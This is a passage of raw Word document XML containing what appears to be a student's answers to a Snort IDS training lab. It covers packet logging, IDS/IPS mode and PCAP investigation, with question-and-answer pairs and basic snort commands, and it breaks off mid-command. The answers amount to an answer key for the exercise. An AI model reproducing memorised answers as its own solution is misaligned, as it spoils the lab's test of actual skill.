        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75291C47" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>To analyze Snort's logging, the user must first generate traffic on the interface. Snort requires root privileges for sniffing traffic, meaning logs are owned by the root user. The user can either elevate privileges to view the logs or change their ownership using "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>chown</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452EB6F8" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C2E2694" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Using the "-l" parameter in Snort logs packets in a specified directory, whereas "-K ASCII" saves logs in a readable format. The logs in ASCII format are organized into directories by IP addresses and are easier to read with a text editor. In contrast, binary logs (created without "-K ASCII") require tools like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> or Snort for analysis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018AD77B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="467949BF" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">The "-r" parameter allows the user to read and filter binary logs. Tools like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> and Wireshark can also open these files. The process can be filtered by specific protocols using BPF.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360F09D7" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79F96028" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>For further analysis, the user can perform filtering commands in Snort or examine the generated logs with the tools mentioned.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEAE3AD" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="442D5B82" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Now, you should have the logs in the current directory. Navigate to folder "145.254.160.237". What is the source port used to connect port 53?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1C6737" w14:textId="45AEB804" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>3009</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD6C51F" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB06C6B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Read the snort.log file with Snort; what is the IP ID of the 10th packet?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3C0AA2" w14:textId="7A4599ED" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>49313</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3674ECF8" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C70A072" w14:textId="7FC39E12" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Read the "snort.log.1640048004" file with Snort; what is the </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>referrer</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> of the 4th packet?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C82D13" w14:textId="076A4D00" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:history="1">
        <w:r w:rsidRPr="00E67FF4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.ethereal.com/development.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5411C570" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05760ED1" w14:textId="4096E344" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Read the "snort.log.1640048004" file with Snort; what is the Ack number of the 8th packet?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D232465" w14:textId="64725EF3" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>0x38AFFFF3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC10581" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68380092" w14:textId="3F40A479" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Read the "snort.log.1640048004" file with Snort; what is the number of the "TCP port 80" packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477ABEA0" w14:textId="4F74A068" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>41</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEFD4F2" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DC91311" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 7: Operation Mode 3: IDS/IPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55ED5422" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CC177FE" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Snort in IDS/IPS mode allows traffic management based on user-defined rules. The mode relies on configurations and rules, with various parameters to control behavior, such as alert types and logging. Key parameters include "-c" for configuration, "-T" for testing, "-N" to disable logging, and "-D" for background operation. Alerts can be displayed in different formats (console, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>cmg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>, fast, full, or none), with each providing varying levels of detail. IPS mode, activated with specific parameters, allows Snort to drop malicious packets. Additionally, Snort can run with just rules without a configuration file for testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7525045E" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="282573B9" w14:textId="1065DE39" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Execute the traffic generator script and choose "TASK-7 Exercise". Wait until the traffic stops, then stop the Snort instance. Now </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>analyze</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> the output summary and answer the question. ("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> snort -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD55780" w14:textId="124072EF" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">What </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00261C8C">
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00261C8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>the number of the detected HTTP GET methods? ("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> ./traffic-generator.sh")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567ADD72" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="768A946D" w14:textId="671CAFE3" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpi">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251677696" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="55486CCB" wp14:editId="4C5BD984">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4502340</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>201465</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="291960" cy="198360"/>
                <wp:effectExtent l="38100" t="38100" r="51435" b="49530"/>
                <wp:wrapNone/>
                <wp:docPr id="1461825895" name="Ink 31"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingInk">
                    <w14:contentPart bwMode="auto" r:id="rId14">
                      <w14:nvContentPartPr>
                        <w14:cNvContentPartPr/>
                      </w14:nvContentPartPr>
                      <w14:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="291960" cy="198360"/>
                      </w14:xfrm>
                    </w14:contentPart>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="4DED2938" id="Ink 31" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:354pt;margin-top:15.35pt;width:24pt;height:16.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">
                <v:imagedata r:id="rId15" o:title=""/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12204352" wp14:editId="596955AE">
            <wp:extent cx="5059680" cy="822960"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="1784406765" name="Picture 2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06765" name="Picture 29" descr="A screen shot of a computer program&#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r="2353" b="72589"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5059680" cy="822960"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE37EAD" w14:textId="09F6ECF9" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">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2</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>1: Number of listed GET methods after analyzing Task 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6D0C03" w14:textId="3D6E98A8" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpi">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251679744" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="56E347A3" wp14:editId="57B697FC">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4427100</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>76535</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="38100" t="38100" r="38100" b="38100"/>
                <wp:wrapNone/>
                <wp:docPr id="895910796" name="Ink 33"/>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0C8DD8DD" id="Ink 33" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:348.1pt;margin-top:5.55pt;width:1.05pt;height:1.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">
                <v:imagedata r:id="rId18" o:title=""/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B72B705" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AE3EBD2" w14:textId="1448FA0F" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpi">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251678720" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4EADD99B" wp14:editId="6B984E38">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>6301620</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>118745</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="38100" t="38100" r="38100" b="38100"/>
                <wp:wrapNone/>
                <wp:docPr id="13466705" name="Ink 3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368E027C" id="Ink 32" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:495.7pt;margin-top:8.85pt;width:1.05pt;height:1.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">
                <v:imagedata r:id="rId20" o:title=""/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>Task 8: Operation Mode 4: PCAP Investigation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DAA930" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43995E5E" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Snort can read and investigate </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> files to provide traffic statistics and alerts based on rulesets. By using the "-r" parameter, you can analyze a single </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file and receive alerts for specific traffic patterns. With the "--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">-list" parameter, multiple </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> files can be analyzed together, though separating the alerts by source requires further steps. The "--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">-show" option displays the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file name during processing, making it easier to differentiate between files. These tools help speed up the investigation process by utilizing known threat patterns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC6245F" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="656E43C0" w14:textId="19FDCDA3" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Investigate the mx-1.pcap file with the default configuration file.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522A04AD" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sudo</w:t>
      </w:r>
